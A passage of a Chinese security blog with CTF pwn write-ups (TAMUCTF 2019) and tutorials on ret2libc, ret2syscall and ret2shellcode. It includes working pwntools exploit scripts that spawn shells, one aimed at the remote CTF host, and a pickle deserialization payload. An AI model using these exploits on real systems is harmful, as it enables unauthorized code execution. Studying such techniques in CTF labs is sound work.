使用IDA打开查看，gets()函数说明存在明显的栈溢出，下面还存在一个select_func()函数，点进去看到v3变量初始值为two，然后将输入的参数复制31个字节到dest变量中，然后if语句判断当dest变量值为one时将one赋值给v3，最后调用v3()函数： 也就是说，存在one()函数和two()函数，在Functions窗口中可看到它们以及print_flag()函数。点进去看one()函数和two()函数并没有发现代码有什么东西。 这里注意到，select_func()函数的参数是从前面gets()函数获取的，也就是说，我们通过gets()输入的内容可以赋值给dest变量31个字节的内容。这里观察下这几个函数的地址： one()函数地址为0x00000754，two()函数地址为0x000006AD，print_flag()函数地址为0x000006D8。 观察到，two()函数与print_flag()函数地址相差一个字节，即AD与D8。 回到前面select_func()函数中可看到，dest变量相对EBP偏移为ebp-2A，v3变量相对EBP偏移为ebp-C，则可知dest与v3之间相对偏移为|(ebp-2A)-(ebp-C)|=1E(h)=30(d)。可以得出如下的栈结构： 很清晰了，结合前面可以通过gets()给dest变量赋值31个字节，减去dest与v3之间偏移的20个字节，剩下1个字节可以溢出。而前面分析知道v3变量初始值为two，且two()函数地址和print_flag()函数地址只相差一个字节，那么就可以溢出这一个字节，将v3的初始值0x000006AD溢出为0x000006D8即可。 注意，两位1十六进制数等同于八位的二进制数，即2^4*2^4=2^8。一个字节=1bytes=8bits=八位二进制数=两位十六进制数。 编写payload： 1234567from pwn import *sh = remote(\"pwn.tamuctf.com\", 4322)payload = flat([\"A\" * 30, \"\\xD8\"])sh.sendline(payload)print sh.recvall() getflag： Pwn3题目如下：pwn3 运行程序，功能是给你一个地址并让你输入内容；该ELF文件是动态链接的；checksec查看发现Canary、NX没有打开，且有RWX即可读写执行的代码段，这里推测应该是一道写shellcode执行的题： 使用IDA打开查看，main()函数调用了echo()函数，在echo()函数中输出了变量s的地址，然后调用gets()函数获取输入内容到s中，明显存在栈溢出漏洞： 虽然程序开启了RELRO，但在开始就输出了s变量的地址，这样就可以通过gets()在s处写入shellcode内容，然后接着溢出够12Ah+4即298+4个字节后将获取到的s地址覆盖掉函数返回地址、使程序跳转至s处执行shellcode： 主要分两步，第1步往s写入shellcode并溢出至函数返回地址处；第2步是用s地址覆盖函数返回地址从而跳转至s处执行shellcode。 编写payload： 123456789101112from pwn import *sh = remote(\"pwn.tamuctf.com\",4323)sh.recvuntil(\"Take this, you might need it on your journey 0x\")addr = int(sh.recv(8), 16)print addrshellcode = asm(shellcraft.sh())payload = flat([shellcode.ljust(0x12A + 4, \"A\"), p32(addr)])sh.sendline(payload)sh.interactive() getshell： Pwn4题目如下：pwn4 运行程序，功能是询问你想调用ls命令查看哪个文件并让你输入内容，这里输入-l flag.txt看到输入flag.txt的内容；该ELF文件是动态链接的；checksec查看发现只开启了NX： 使用IDA打开分析，发现循环调用laas()函数： 进入laas()函数，gets()函数获取输出，存在栈溢出漏洞，然后比较s变量值是否为ASCII码为47即斜杠/，用来过滤跨目录的注入，若没有则传入s参数调用run_cmd()函数： 在run_cmd()函数未进行任何过滤直接调用system()函数执行系统命令： 是的，作为一个Web狗，第一直觉就是命令注入，然后getflag了： 但是吧，还是要按部就班地用Pwn的方法做。可以确定了，是利用ret2libc来实现getshell，因为这里已经有了system()函数，剩下的就是找/bin/sh字符串了。 打开String窗口，看到真的有/bin/sh字符串，地址为0x0804A034： 再看下call system()的地址，为0x080485AD： 和ret2libc1原理一致，如下图： 编写payload： 其实这里system_addr地址并非system()函数地址而是call system的地址，所以此处无需再添加返回地址。 1234567891011from pwn import *sh = remote(\"pwn.tamuctf.com\", 4324)sh.recvuntil(\"Enter the arguments you would like to pass to ls:\")system_addr = 0x080485ADbinsh_addr = 0x0804A034payload = flat([\"A\" * 0x21, \"BBBB\", system_addr, binsh_addr])sh.sendline(payload)sh.interactive() getshell： Pwn5题目如下：pwn5 程序功能点和Pwn4一样；file命令查看该ELF文件是静态的，即和libc无关；checksec查看发现只开启了NX： 使用IDA打开分析，和Pwn4几乎一致，但是在run_cmd()函数赋值给v2变量的长度缩小为7个字节： 这里限制了输入命令的长度为7个字节，是否还能存在命令注入呢？像Pwn4那样肯定是行不通的，但是我们可以输入sh来打开shell： 当然，还有一种利用vi命令及:shell的骚姿势，输入;vi再输入:shell即可执行shell： 回到正轨，利用原理和Pwn4一样，laas()函数中的gets()存在栈溢出漏洞，打开String窗口寻找到“/bin/sh”，地址为0x080BC140： 而在Functions窗口中搜索system()函数得到其地址为0x0804EE30： 在Functions窗口中搜索exit()函数查看其地址为0x0804E330： 编写payload： 123456789101112from pwn import *sh = remote(\"pwn.tamuctf.com\", 4325)sh.recvuntil(\"Enter the arguments you would like to pass to ls:\")system_addr = 0x0804EE30exit_addr = 0x0804E330binsh_addr = 0x080BC140payload = flat([\"A\" * (0xD + 4), system_addr, exit_addr, binsh_addr])sh.sendline(payload)sh.interactive() getshell： VeggieTales题目如下，并没有给ELF文件，大概意思是我最爱看的节目同时也训练我的Python技能，我看了第5集至少13遍了： 蒙了，没有ELF，nc过去看看： 可以添加、打印、备份及加载你的观看列表。难道是黑盒堆溢出利用？？？肯定不是。 再看下提示，说一直看第5集，我们测它的功能的时候，在输入1时会让选择要第几个节目，观察到第5个节目内容如下： “Dave and the Giant Pickle”，注意到Pickle，再联系hint中的Python，可以推测应该是Python的Pickle反序列化漏洞。 关于Python的Pickle反序列化漏洞可参考Python cPickle反序列化漏洞。 逐个输入查看，添加第5集，然后输入2看到已添加进去，再输入3备份watch list、生成一个base64的东西，用于后面输入4时加载备份，当选项4中获取的输入内容不是该base64内容时会报错： 将该base64解码，得不到啥东西。 再回到hint，至少13次，由此可以推测，应该和ROT13算法有关吧。那就试下将该base64内容先进行ROT13解码再进行base64解码吧： 可以看到确实是包含该第5集的内容的，但是其中有一些非可见字符。 结合前面推测的Pickle反序列化漏洞，我们可以尝试在输入4选项即要求输入备份编码内容时，输入一段经过base64和ROT13加密的Pickle对象，其中包含字符串“Mi1k7ea”： 12345import codecsimport base64import cPickleprint codecs.encode(str(base64.b64encode(cPickle.dumps(['Mi1k7ea']))), \"rot-13\") cPickle.dumps()序列化一个列表为字符串，为啥不直接填字符串而加上[]呢？这是为了后面输入时输出在同一行好查看。content即为序列化后的字符串内容，再加密后输入到4选项中，再到2选项中查看，发现成功反序列化处该cPickle序列化对象，即证明了是cPickle反序列化漏洞了： OK，现在就输入一段经过base64和ROT13加密的序列化对象，利用反序列化来触发该漏洞，编写代码如下： 123456789101112import codecsimport base64import cPickleimport osimport subprocessclass Mi1k7ea(object): def __reduce__(self): # return (os.system, ('/bin/sh',)) return (subprocess.Popen, (('/bin/sh',),))print codecs.encode(base64.b64encode(cPickle.dumps(Mi1k7ea())), \"rot-13\") 这里有个坑，一直尝试用os.system()执行命令的方式老出差、没法成功反序列化，卡了很久，但改用subprocess.Popen()却可以成功： 要想使用os.system()成功执行，不能使用codecs中的rot-13，我们可以使用系统tr &#39;A-Za-z&#39; &#39;N-ZA-Mn-za-m&#39;命令来实现： 题目源码server.py： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152my_episodes = []all_episodes = [\"1. Wheres God When Im S-Scared?\",\"2. God Wants Me to Forgive Them!?!\",\"3. Are You My Neighbor?\",\"4. Rack, Shack and Benny\",\"5. Dave and the Giant Pickle\",\"6. The Toy That Saved Christmas\",\"7. Larry-Boy! And the Fib from Outer Space!\",\"8. Josh and the Big Wall!\",\"9. Madame Blueberry\",\"10. Larry-Boy and the Rumor Weed\",\"11. King George and the Ducky\",\"12. Esther... The Girl Who Became Queen\",\"13. Lyle the Kindly Viking\",\"14. The Star of Christmas\",\"15. The Wonderful World of Autotainment\",\"16. The Ballad of Little Joe\",\"17. An Easter Carol\",\"18. A Snoodles Tale\",\"19. Sumo of the Opera\",\"20. Duke and the Great Pie War\",\"21. Minnesota Cuke and the Search for Samsons Hairbrush\",\"22. Lord of the Beans\",\"23. Sheerluck Holmes and the Golden Ruler\",\"24. LarryBoy and the Bad Apple\",\"25. Gideon: Tuba Warrior\",\"26. Moe and the Big Exit\",\"27. The Wonderful Wizard of Has\",\"28. Tomato Sawyer and Huckleberry Larrys Big River Rescue\",\"29. Abe and the Amazing Promise\",\"30. Minnesota Cuke and the Search for Noahs Umbrella\",\"31. Saint Nicholas: A Story of Joyful Giving\",\"32. Pistachio - The Little Boy That Woodnt\",\"33. Sweetpea Beauty: A Girl After Gods Own Heart\",\"34. Its a Meaningful Life\",\"35. Twas The Night Before Easter\",\"36. Princess and the Popstar\",\"37. The Little Drummer Boy\",\"38. Robin Good And His Not-So Merry Men\",\"39. The Penniless Princess\",\"40. The League of Incredible Vegetables\",\"41. The Little House That Stood\",\"42. MacLarry and the Stinky Cheese Battle\",\"43. Merry Larry and the True Light of Christmas\",\"44. Veggies in Space: The Fennel Frontier\",\"45. Celery Night Fever\",\"46. Beauty and the Beet\",\"47. Noahs Ark\"] def sortByNum(episode): return int(episode[:episode.find('.')])def add_episode(): for episode in all_episodes: print(\"%s\" % episode) episode_num = str(input(\"Enter an episode (by number) to add to your watched list: \")) while not (episode_num.isdigit() and (0 &lt; int(episode_num) &lt; 48)): episode_num = str(input(\"Enter a valid integer between 1 and 47!!\")) if all_episodes[int(episode_num)-1] in my_episodes: print(\"That episode is already in your list.\") else: my_episodes.append(all_episodes[int(episode_num)-1]) print(\"episode added!\") my_episodes.sort(key=sortByNum)def check_list(): print(\"----------------------\") print(\"List of watched episodes:\") if len(my_episodes) == 0: print(\":(\") for episode in my_episodes: print(\"%s\" % episode) print(\"----------------------\")def backup_list(): pickled = codecs.encode(str(base64.b64encode(pickle.dumps(my_episodes))),\"rot-13\").strip(\"o\\'\") print(\"Episode list backup string (Don't lose it!): %s\\n\" % pickled)def load_list(): answer = str(input(\"Load your backed up list here: \")) try: global my_episodes my_episodes = pickle.loads(base64.b64decode(codecs.encode(answer,\"rot-13\"))) print(\"Loaded backup\\n\") except: print(\"Invalid backup\")if __name__ == \"__main__\": print(\"Do you like VeggieTales??\") message = \"1. Add an episode to your watched list\\n2. Print your watch list\\n3. Backup your watch list\\n4. Load your watch list\\n\" while True: listen = str(input(message)) if len(listen) == 1 and listen in \"1234\": [add_episode, check_list, backup_list, load_list][int(listen) - 1]() message = \"1. Add an episode to your watched list\\n2. Print your watch list\\n3. Backup your watch list\\n4. Load your watch list\\n\" else: message = \"Error: Please choose from options 1-4!!\\n\" 看来这是一道归类到Pwn的Web题 : ) Pwn6Pwn6没做出来也不会做，可以参考其他大佬的writeup： pwn6 - Pwn TAMUCTF 2019","tags":[{"name":"二进制","slug":"二进制","permalink":"https://www.mi1k7ea.com/tags/二进制/"},{"name":"Pwn","slug":"Pwn","permalink":"https://www.mi1k7ea.com/tags/Pwn/"}]},{"title":"栈溢出之ret2libc","date":"2019-03-05T14:39:35.000Z","path":"2019/03/05/栈溢出之ret2libc/","text":"ret2libc原理ret2libc，即控制执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。 具体过程为：在内存中确定某个函数的地址，并用其覆盖掉返回地址，让其指向前面确定的函数。由于 libc 动态链接库中的函数被广泛使用，所以有很大概率可以在内存中找到该动态库。同时由于该库包含了一些系统级的函数（例如 system() 等），所以通常使用这些系统级函数来获得当前进程的控制权。鉴于要执行的函数可能需要参数，比如调用 system() 函数打开 shell 的完整形式为 system(“/bin/sh”) ，所以溢出数据也要包括必要的参数。 payload: padding1 + address of system() + padding2 + address of “/bin/sh” padding1 处的数据可以随意填充（注意不要包含 “\\x00” ，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of system() 是 system() 在内存中的地址，用来覆盖返回地址。padding2 处的数据长度为4（32位机），对应调用 system() 时的返回地址。因为我们在这里只需要打开 shell 就可以，并不关心从 shell 退出之后的行为，所以 padding2 的内容可以随意填充。address of “/bin/sh” 是字符串 “/bin/sh” 在内存中的地址，作为传给 system() 的参数。 第一个问题——system()地址如何确定？ 要回答这个问题，就要看看程序是如何调用动态链接库中的函数的。当函数被动态链接至程序中，程序在运行时首先确定动态链接库在内存的起始地址，再加上函数在动态库中的相对偏移量，最终得到函数在内存的绝对地址。说到确定动态库的内存地址，就要回顾一下 shellcode 中提到的内存布局随机化（ASLR），这项技术也会将动态库加载的起始地址做随机化处理。所以，如果操作系统打开了 ASLR，程序每次运行时动态库的起始地址都会变化，也就无从确定库内函数的绝对地址。在 ASLR 被关闭的前提下，我们可以通过调试工具在运行程序过程中直接查看 system() 的地址，也可以查看动态库在内存的起始地址，再在动态库内查看函数的相对偏移位置，通过计算得到函数的绝对地址。 第二个问题——“/bin/sh”字符串地址如何确定？ 可以在动态库里搜索这个字符串，如果存在，就可以按照动态库起始地址＋相对偏移来确定其绝对地址。如果在动态库里找不到，可以将这个字符串加到环境变量里，再通过 getenv() 等函数来确定地址。 前提条件 由前面分析可知，ret2libc这项技术的前提是需要操作系统关闭内存布局随机化（ASLR）。 ret2libc1——存在system()、/bin/sh运行程序，提示应用ret2libc，且用file查看是动态链接文件，和libc有关： 查看保护机制，只开启了NX： IDA查看： 搜索“/bin/sh”字符串，可通过string窗口或ROPgadget工具查找： 或 可知“/bin/sh”字符串所在地址为0x08048720。 因为要从libc中寻找利用函数，则可以在ida直接查看plt中是否有system()函数，发现是存在有的且地址为0x08048460： 至于用户输入的变量v4距函数返回地址的偏移地址的计算如之前所示，结果是一样的为0x70。 编写payload： 12345678from pwn import *sh = process(\"./ret2libc1\")binsh_addr = 0x08048720libc_system_addr = 0x08048460payload = flat([\"A\" * 0x70, libc_system_addr, \"6666\", binsh_addr])sh.sendline(payload)sh.interactive() 运行getshell： ret2libc2——只有system()运行程序，file查看文件为动态链接即和libc相关，查看保护机制只开启NX： 使用IDA打开查看： 在string窗口确实找不到“/bin/sh”： 在plt中仍可找到system()函数，地址为0x08048490： 可以发现与示例1相比，这次不直接提供“/bin/sh”，那就换种思维，多利用一个gadgets，可以在plt中看到有gets()函数，即可以将该gets()函数地址用来踩掉原本程序函数的返回地址，然后通过输入的方式将“/bin/sh”输入进去。换句话说，整个过程分成了两部分，第一部分是将“/bin/sh”读入到内存中；第二部分是执行system()获取shell： 其中可知get()函数地址为08048460。 查看gets()函数，其需要一个可读可写的指针参数，且会返回值： 寻找一块可读可写的buffer区，通常会寻找.bss段，使用IDA查看可看到存在buf2[100]数组： 明确该.bss段是否可读可写： 最后就是payload的构造了。因为在gets()函数完成后需要调用system()函数需要保持堆栈平衡，所以在调用完gets()函数后提升堆栈，这就需要add esp, 4这样的指令但是程序中并没有这样的指令。更换思路，通过使用pop xxx指令也可以完成同样的功能，在程序中找到了pop ebx，ret指令。通过ROPgadget工具查看，发现存在一条符合条件的指令，地址为0x0804841d： 编写payload： 1234567891011from pwn import *sh = process(\"./ret2libc2\")libc_gets_addr = 0x08048460libc_system_addr = 0x08048490buf2_addr = 0x0804a080pop_ebx_addr = 0x0804841dpayload = flat([\"A\" * 0x70, libc_gets_addr, pop_ebx_addr, buf2_addr, libc_system_addr, '6666', buf2_addr])sh.sendline(payload)sh.sendline('/bin/sh')sh.interactive() 运行getshell： ret2libc3——无system()和/bin/sh在ret2libc2的基础上，再次将system()函数的地址去掉。此时，我们需要同时找到system())函数地址与”/bin/sh”字符串的地址。 题目分析运行程序，file查看文件为动态链接即和libc相关，查看保护机制只开启NX： IDA打开查看，同样是栈溢出漏洞： 在String窗口找不到“/bin/sh”字符串，在Functions窗口中也找不到system()函数： 但是在libc中是有system()函数和/bin/sh字符串的。因此，我们可以通过泄露libc中某个被调用过的函数的地址来获取libc版本，获取libc中各个偏移地址值，然后通过某个函数的真实地址计算出system()和/bin/bash的真实地址。 结合前面知道，溢出点到函数返回地址的偏移量和前面的一样，为112。 结合libc的延迟绑定机制，下面要做的是需要我们泄露某个已经执行过的函数的真实地址，实现泄露地址功能的函数可以通过puts()函数来输出打印出来实现，而参数填的是某个已经执行过的函数的GOT地址；同时为了程序再次执行能重新实现栈溢出功能，在puts()函数的返回地址填的是_start()函数或main()函数地址即可。 对于system()函数，其属于libc，在libc.so动态链接库中的函数之间相对偏移是固定的。我们由泄露的某个函数的GOT表地址可以计算出偏移地址（A真实地址-A的偏移地址 = B真实地址-B的偏移地址 = 基地址），从而可以得到system()函数的真实地址（当然也可以直接调用pwntools的libc.address得到libc的真实地址，然后再直接查找即可找到真实的system()函数地址）。 利用过程图以泄露puts()的GOT地址为例，构造过程如下图，红色箭头为第一次溢出调用，通过gets()栈溢出至函数返回地址处将其覆盖为puts的plt地址，将puts的GOT表地址泄露输出出来，再返回到_start()函数重新执行程序；蓝色箭头为程序第二次执行时的溢出调用，重新通过gets()输入内容栈溢出至函数返回地址处，覆盖该地址为libc中找到的system()地址（libc地址由泄露的puts函数地址计算得出），从而getshell： 利用过程小结 程序通过gets()函数获取输入的内容，存在明显的栈溢出漏洞； 在ELF中未找到system()和”/bin/sh”； 计算出输入内容地址到函数返回地址的偏移量为112； 将puts()的plt地址覆盖到函数返回地址处，通过puts()泄露某个已执行过的函数的GOT地址，并且返回地址设置为_start()或main()，以便于重新执行一遍程序； 通过recv(4)接收puts()输出泄露的某个已执行过的函数的GOT地址，再以此来计算libc中地址与真实地址的偏移量，从而计算出libc中system()函数和”/bin/sh”字符串的真实地址；或者通过泄露的某个已执行过的函数的GOT地址，直接使用pwntools的libc.address=func_got-libc.symbols[‘func’]的形式直接获取libc的真实地址，从而直接通过system_addr=libc.symbols[‘system’]的方式直接获取该函数真实地址； 程序再次执行时填充padding，在函数返回地址处覆盖为libc中system()函数的真实地址，其中参数为libc中”/bin/sh”字符串的真实地址。 payload编写在第一次栈溢出puts()的plt地址覆盖函数返回地址时，puts()的返回地址可以设置为_start()或main()函数地址。 _start()和main()的区别简单地说，main()函数是用户代码的入口，是对用户而言的；而_start()函数是系统代码的入口，是程序真正的入口。 我们可以看下本题的_start()函数内容，其包含main()和__libc_start_main()函数的调用，也就是说，它才是程序真正的入口： 返回地址为_start()函数这里的示例只展示了两个可利用的函数puts()和__libc_start_main()。 泄露puts()函数地址 12345678910111213141516171819202122232425262728293031323334from pwn import *sh = process('./ret2libc3')elf = ELF('./ret2libc3')libc = elf.libcputs_plt = elf.plt['puts']puts_got = elf.got['puts']start_addr = elf.symbols['_start']print \"[*]puts plt: \" + hex(puts_plt)print \"[*]puts got: \" + hex(puts_got)print \"[*]_start addr: \" + hex(start_addr)print \"[*]libc addr: \" + hex(libc.address)print \"--\" * 20print \"[*]sending payload1 to leak libc...\"payload = flat([\"A\" * 112, puts_plt, start_addr, puts_got])sh.sendlineafter(\"Can you find it !?\", payload)puts_addr = u32(sh.recv(4))print \"[*]leak puts addr: \" + hex(puts_addr)libc.address = puts_addr - libc.symbols['puts']system_addr = libc.symbols['system']binsh_addr = next(libc.search('/bin/sh'))print \"[*]leak libc addr: \" + hex(libc.address)print \"[*]system addr: \" + hex(system_addr)print \"[*]binsh addr: \" + hex(binsh_addr)print \"--\" * 20print \"[*]sending payload2 to getshell...\"payload2 = flat([\"B\" * 112, system_addr, \"CCCC\", binsh_addr])sh.sendline(payload2)sh.interactive() 泄露__libc_start_main()函数地址 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *sh = process('./ret2libc3')elf = ELF('./ret2libc3')libc = elf.libcputs_plt = elf.plt['puts']#puts_got = elf.got['puts']libc_start_main_got = elf.got['__libc_start_main']start_addr = elf.symbols['_start']print \"[*]puts plt: \" + hex(puts_plt)print \"[*]__libc_start_main got: \" + hex(libc_start_main_got)#print \"[*]puts got: \" + hex(puts_got)print \"[*]_start addr: \" + hex(start_addr)print \"[*]libc addr: \" + hex(libc.address)print \"--\" * 20print \"[*]sending payload1 to leak libc...\"#payload = flat([\"A\" * 112, puts_plt, start_addr, puts_got])payload = flat([\"A\" * 112, puts_plt, start_addr, libc_start_main_got])sh.sendlineafter(\"Can you find it !?\", payload)#puts_addr = u32(sh.recv(4))#print \"[*]leak puts addr: \" + hex(puts_addr)libc_start_main_addr = u32(sh.recv(4))print \"[*]leak __libc_start_main addr: \" + hex(libc_start_main_addr)#libc.address = puts_addr - libc.symbols['puts']libc.address = libc_start_main_addr - libc.symbols['__libc_start_main']system_addr = libc.symbols['system']binsh_addr = next(libc.search('/bin/sh'))print \"[*]leak libc addr: \" + hex(libc.address)print \"[*]system addr: \" + hex(system_addr)print \"[*]binsh addr: \" + hex(binsh_addr)print \"--\" * 20print \"[*]sending payload2 to getshell...\"payload2 = flat([\"B\" * 112, system_addr, \"CCCC\", binsh_addr])sh.sendline(payload2)sh.interactive() 返回地址为main()函数先将_start()换成main()，payload2的B字符的偏移量不变，运行脚本会报错，添加GDB调试交互发现溢出多了8个B： 相应的，减少8个B字符即112-8=104就可以有效溢出从而getshell： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *sh = process('./ret2libc3')elf = ELF('./ret2libc3')libc = elf.libcif args.M: gdb.attach(sh)puts_plt = elf.plt['puts']#puts_got = elf.got['puts']libc_start_main_got = elf.got['__libc_start_main']#start_addr = elf.symbols['_start']main_addr = elf.symbols['main']print \"[*]puts plt: \" + hex(puts_plt)print \"[*]__libc_start_main got: \" + hex(libc_start_main_got)#print \"[*]puts got: \" + hex(puts_got)#print \"[*]_start addr: \" + hex(start_addr)print \"[*]main addr: \" + hex(main_addr)print \"[*]libc addr: \" + hex(libc.address)print \"--\" * 20print \"[*]sending payload1 to leak libc...\"#payload = flat([\"A\" * 112, puts_plt, start_addr, puts_got])#payload = flat([\"A\" * 112, puts_plt, start_addr, libc_start_main_got])payload = flat([\"A\" * 112, puts_plt, main_addr, libc_start_main_got])sh.sendlineafter(\"Can you find it !?\", payload)#puts_addr = u32(sh.recv(4))#print \"[*]leak puts addr: \" + hex(puts_addr)libc_start_main_addr = u32(sh.recv(4))print \"[*]leak __libc_start_main addr: \" + hex(libc_start_main_addr)#libc.address = puts_addr - libc.symbols['puts']libc.address = libc_start_main_addr - libc.symbols['__libc_start_main']system_addr = libc.symbols['system']binsh_addr = next(libc.search('/bin/sh'))print \"[*]leak libc addr: \" + hex(libc.address)print \"[*]system addr: \" + hex(system_addr)print \"[*]binsh addr: \" + hex(binsh_addr)print \"--\" * 20print \"[*]sending payload2 to getshell...\"payload2 = flat([\"B\" * 104, system_addr, \"CCCC\", binsh_addr])sh.sendline(payload2)sh.interactive() 参考手把手教你栈溢出从入门到放弃（上） ret2libc","tags":[{"name":"二进制","slug":"二进制","permalink":"https://www.mi1k7ea.com/tags/二进制/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://www.mi1k7ea.com/tags/栈溢出/"},{"name":"Pwn","slug":"Pwn","permalink":"https://www.mi1k7ea.com/tags/Pwn/"}]},{"title":"栈溢出之ret2syscall","date":"2019-03-03T14:48:29.000Z","path":"2019/03/03/栈溢出之ret2syscall/","text":"ret2syscallret2syscall，即控制程序执行系统调用，获取shell。 关键在于——程序中存在int 0x80中断，通过该指令可以进行系统调用，其中可通过不同的系统调用号调用不同的系统调用。 一般地，我们利用如下系统调用来获取shell： 1execve(&quot;/bin/sh&quot;,NULL,NULL) 当遇到32位程序时，需要使得： 系统调用号，即 eax 应该为 0xb（0xb 为 execve 对应的系统调用号） 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。 第二个参数，即 ecx 应该为 0 第三个参数，即 edx 应该为 0 而我们如何控制这些寄存器的值呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。 解题过程先运行程序查看基本功能，并file看到是静态链接文件，和libc无关： checksec发现只开启了NX： 打开IDA看到存在gets()即存在栈溢出风险，且IDA中给出变量v4相对于ESP和EBP的偏移分别为ESP+1Ch和EBP-64h： 查看String窗口，发现存在“/bin/sh”字符串： 当然还可以使用ROPgadget工具搜索，直接找到“/bin/sh”字符串的存储地址，记下该字符串地址为0x080be408： 因为是静态链接，不用看libc相关函数，而且函数太多了，直接搜索系统调用吧，记下系统调用的地址为0x08049421： 接着寻找pop eax~edx+ret寄存器的指令，记下符合条件的地址分别为0x080bb196和0x0806eb90： 至于v4变量到函数返回地址处的偏移量和前面几个题目的计算方法即结果都是一样的，这里不再多说。 编写payload： 12345678910from pwn import *sh = process(\"./ret2syscall\")int_80_addr = 0x08049421binsh = 0x080be408pop_eax_addr = 0x080bb196pop_edx_ecx_ebx_addr = 0x0806eb90payload = flat([\"A\" * 0x70, pop_edx_ecx_ebx_addr, 0, 0, binsh, pop_eax_addr, 0xb, int_80_addr])sh.sendline(payload)sh.interactive() 运行后getshell： 参考ret2syscall","tags":[{"name":"二进制","slug":"二进制","permalink":"https://www.mi1k7ea.com/tags/二进制/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://www.mi1k7ea.com/tags/栈溢出/"},{"name":"Pwn","slug":"Pwn","permalink":"https://www.mi1k7ea.com/tags/Pwn/"}]},{"title":"栈溢出之ret2shellcode","date":"2019-03-03T10:52:58.000Z","path":"2019/03/03/栈溢出之ret2shellcode/","text":"ret2shellcoderet2shellcode，即控制程序执行shellcode代码——修改函数返回地址，让其指向溢出数据中的一段指令。 shellcode指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。另外，要想执行 shellcode，需要shellcode所在的区域具有可执行权限。 ret2shellcode的实现在于：在溢出数据内包含一段攻击指令，用攻击指令的起始地址覆盖掉返回地址。 payload : padding1 + address of shellcode + padding2 + shellcode padding1 处的数据可以随意填充（注意如果利用字符串程序输入溢出数据不要包含 “\\x00” ，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of shellcode 是后面 shellcode 起始处的地址，用来覆盖返回地址。padding2 处的数据也可以随意填充，长度可以任意。shellcode 应该为十六进制的机器码格式，但有个前提是shellcode所在的代码段需要具有可执行权限。 一个问题——shellcode地址如何确定？ 我们可以在调试工具里查看返回地址的位置（可以查看 ebp 的内容然后再加4（32位机）），可是在调试工具里的这个地址和正常运行时并不一致，这是运行时环境变量等因素有所不同造成的。所以这种情况下我们只能得到大致但不确切的 shellcode 起始地址，解决办法是在 padding2 里填充若干长度的 “\\x90”。这个机器码对应的指令是 NOP (No Operation)，也就是告诉 CPU 什么也不做，然后跳到下一条指令。有了这一段 NOP 的填充，只要返回地址能够命中这一段中的任意位置，都可以无副作用地跳转到 shellcode 的起始处，所以这种方法被称为 NOP Sled。这样我们就可以通过增加 NOP 填充来配合试验 shellcode 起始地址。 操作系统可以将函数调用栈的起始地址设为随机化（这种技术被称为内存布局随机化，即ASLR），这样程序每次运行时函数返回地址会随机变化。反之如果操作系统关闭了上述的随机化（这是技术可以生效的前提），那么程序每次运行时函数返回地址会是相同的，这样我们可以通过输入无效的溢出数据来生成core文件，再通过调试工具在core文件中找到返回地址的位置，从而确定 shellcode 的起始地址。 最后可以拼接出最终的溢出数据，输入至程序来执行 shellcode 了： 这种方法生效的一个前提是在函数调用栈上的数据（shellcode）要有可执行的权限（另一个前提是上面提到的关闭内存布局随机化）。很多时候操作系统会关闭函数调用栈的可执行权限，这样 shellcode 的方法就失效了，不过我们还可以尝试使用内存里已有的指令或函数，毕竟这些部分本来就是可执行的，所以不会受上述执行权限的限制。这就包括ret2libc等其他的ROP方法。 前提条件 由前面分析可知，ret2shell这项技术的前提是需要操作系统关闭内存布局随机化（ASLR）以及需要程序调用栈有可执行权限。 解题过程运行程序，提示这次没有system()给你直接调用，且文件是动态链接的： checksec可以看出源程序没有开启任何保护： IDA打开查看，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到buf2处，简单地说，就是程序允许用户输入一段内容，然后程序将该内容复制到buf2中： 点击查看可知buf2在bss段： string窗口确实如题目所示，没有直接提供system(“/bin/sh”)给我们调用了： 为了明确是否可以将shellcode写入buf2中执行，通过vmmap可以看到bss段对应的地址具有可执行权限（先main下断点、r再vmmap）： 可以看到，buf2变量所在的bss段是可读可写可执行的，因此这里可以输入shellcode、然后程序将shellcode复制至此处，最后在函数返回地址处踩掉该地址跳转至buf2执行shellcode。整个过程即为ret2shellcode原理。 使用GDB pattern字符串溢出计算变量v4到函数返回地址的偏移量为112，即0x70： 编写payload，使用pwntools的asm(shellcraft.sh())可以直接简便地生成汇编代码形式的反弹shell的shellcode： 12345678from pwn import *sh = process(\"./ret2shellcode\")shellcode = asm(shellcraft.sh())buf2_addr = 0x0804a080payload = flat([shellcode.ljust(0x70, \"A\"), buf2_addr])sh.sendline(payload)sh.interactive() 运行直接getshell： 参考手把手教你栈溢出从入门到放弃（上） ret2shellcode","tags":[{"name":"二进制","slug":"二进制","permalink":"https://www.mi1k7ea.com/tags/二进制/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://www.mi1k7ea.com/tags/栈溢出/"},{"name":"Pwn","slug":"Pwn","permalink":"https://www.mi1k7ea.com/tags/Pwn/"}]},{"title":"ROP基础及栈溢出之ret2text","date":"2019-03-03T08:18:36.000Z","path":"2019/03/03/ROP之ret2text/","text":"ROPROP，Return Oriented Programming，核心操作就是——修改返回地址，让其指向内存中已有的一段指令，可用于绕过NX的保护机制。 ROP的思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以ret结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。 之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件： 程序存在溢出，并且可以控制返回地址。 